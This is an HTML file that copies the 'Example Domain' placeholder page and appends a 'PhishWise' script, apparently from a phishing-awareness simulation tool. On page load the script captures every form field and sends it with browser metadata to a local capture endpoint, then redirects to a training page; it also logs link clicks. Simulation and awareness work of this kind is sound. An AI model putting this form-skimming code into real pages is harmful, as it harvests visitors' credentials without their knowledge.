<!DOCTYPE html><html><head>
    <title>Example Domain</title>

    <meta charset="utf-8">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
        
    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 2em;
        background-color: #fdfdff;
        border-radius: 0.5em;
        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        div {
            margin: 0 auto;
            width: auto;
        }
    }
    </style>    
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.</p>
    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
</div>



    <script>
      (function() {
        console.log('PhishWise tracking activé');

        // Intercepter tous les formulaires
        document.addEventListener('DOMContentLoaded', function() {
          const forms = document.querySelectorAll('form');

          forms.forEach(function(form) {
            form.addEventListener('submit', function(e) {
              e.preventDefault();

              // Collecter les données du formulaire
              const formData = new FormData(form);
              const data = {};

              for (let [key, value] of formData.entries()) {
                data[key] = value;
              }

              // Ajouter des métadonnées
              data._campaignId = '686349caf772a908f4c209f9';
              data._timestamp = new Date().toISOString();
              data._userAgent = navigator.userAgent;
              data._referrer = document.referrer;
              data._url = window.location.href;

              // Envoyer les données au serveur PhishWise
              fetch('http://localhost:3000/api/phishing/capture', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
              }).then(function() {
                // Rediriger vers la page d'apprentissage
                window.location.href = 'http://localhost:3000/learning/686349caf772a908f4c209f9';
              }).catch(function(error) {
                console.error('Erreur lors de l\'envoi des données:', error);
                // Redirection de fallback
                setTimeout(function() {
                  window.location.href = 'http://localhost:3000/learning/686349caf772a908f4c209f9';
                }, 1000);
              });
            });
          });

          // Tracker les clics sur les liens
          document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' || e.target.closest('a')) {
              const link = e.target.tagName === 'A' ? e.target : e.target.closest('a');

              // Envoyer l'événement de clic
              fetch('http://localhost:3000/api/phishing/track-click', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  campaignId: '686349caf772a908f4c209f9',
                  clickedUrl: link.href,
                  timestamp: new Date().toISOString(),
                  userAgent: navigator.userAgent
                })
              }).catch(console.error);
            }
          });
        });
      })();
    </script>
</body></html>
